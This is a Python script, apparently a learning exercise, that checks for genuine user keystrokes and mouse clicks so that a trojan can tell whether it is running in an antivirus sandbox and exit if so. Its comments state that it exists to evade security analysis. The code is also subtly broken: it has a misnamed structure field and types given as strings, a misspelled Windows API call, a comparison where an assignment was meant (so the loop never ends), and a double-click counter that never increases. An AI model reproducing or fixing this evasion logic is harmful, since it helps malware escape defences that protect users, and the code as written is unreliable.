# Since antiviruses started using Sandboxing to determine sus behaviour, we need to learn to avoid falling in a sandbox
# This, whether the sandbox runs on network perimeter, popular option, or directly on the target machine
# We do this by, basicaly, looking for usser interaction, since sandboxes are usualy automated
# 
# The result of the timestamp should be judged based on the specific trojaning tactic used 

from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api

class LASTINPUTINFO(Structure): # Time stamp in millisecond of the last input recorded
    fields_ = [('cbSize', 'c_uint'), ('dwTime', 'c_ulong')]
    
def get_last_input(): # Determine the last time of inut
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO) # Init cbSize
    
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo)) # Populates dwTime with a time stapm
    run_time = windll.kernel32.GetTickCount() # For how long has the system been runring
    
    elapsed = run_time - struct_lastinputinfo.dwTime # calculates acc last input
    print(f"[*] It's been {elapsed} milliseconds since the last event")
    
    return elapsed

#while True: # Tester
#    get_last_input()
#    time.sleep(1)

class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0
    
    def get_key_press(self):
        for i in range (0, 0xff): # For each key
            state = win32api.GetAsynKeyState(i) # Check if it has been pressed
            
            if state & 0x0001: # If pressed
                
                if i == 0x1: # And mouse clicked
                    self.mouse_clicks += 1
                    return time.time()
            
                elif i>32 and i<127: # And keyboard key
                    self.keystrokes += 1
        
        return None
    
    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35
        
        max_double_clicks = 10
        max_keystrokes = random.randint(10,25)
        max_mouse_clicks = random.randint(5, 25)
        max_input_threshold = 30000
        
        last_input = get_last_input() # Retreive elapsed time
        if last_input>=max_input_threshold:
            sys.exit(0)
        
        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press() # check for keyresses or mouse clicks
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp # Time elapsed between mouse cliks
                
                if elapsed<=double_click_threshold: # Compare to threshold to see if double click
                    self.mouse_clicks -= 2
                    self.mouse_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    elif self.double_clicks >= max_double_clicks: # Check for click event streaming
                        if (keypress_time - first_double_click <= (max_double_clicks*double_click_threshold)):
                            sys.exit(0) # Out if too many double clicks in succesion (odd behaviour)
                if (self.keystrokes>=max_keystrokes and self.double_clicks>=max_double_clicks and self.mouse_clicks>=max_mouse_clicks): 
                        detection_complete==True # Check if we've reached the max to be concidered safe
    
                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == '__main__':
    d = Detector()
    d.detect()
    print('okay.')
                        